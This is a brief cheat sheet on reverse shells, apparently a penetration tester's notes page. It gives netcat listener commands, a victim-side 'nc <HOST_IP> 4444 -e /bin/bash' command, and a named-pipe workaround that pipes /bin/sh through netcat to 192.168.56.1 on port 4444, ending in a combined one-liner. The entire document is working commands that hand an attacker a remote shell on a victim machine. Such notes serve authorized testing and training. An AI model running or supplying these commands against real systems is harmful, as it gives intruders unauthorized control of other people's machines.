# Reverse Shells

### Netcat

There are different variants of netcat, so if things doesn't work, you probably want to get some error output from the victim (`2> /tmp/err`)

```sh
# Host
nc -lvp 4444
# Host (macOS)
nc -v -l 4444

# Victim
nc <HOST_IP> 4444 -e /bin/bash
```

Sometimes the victim machine might not have `-e` argument enabled, then we can hack our way using the following command

_Credit:_ [_https://spencerdodd.github.io/2017/02/21/reverse\_shell\_without\_nce/_](https://spencerdodd.github.io/2017/02/21/reverse\_shell\_without\_nce/) __&#x20;

```sh
# Create a new file system node, with type pipe
mknod /tmp/backpipe p
# Then we create this nice cycle of pipe
# First part will redirect stdout of backpipe to /bin/sh, which is used to execute commands
# Second part will redirect output of nc to the pipe, which connects to the first part for command execution
# Result of the command then gets piped to nc using `|` operator, finishing the cycle
/bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe

# Combined, you can have a nice script like
rm /tmp/backpipe && mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe
```
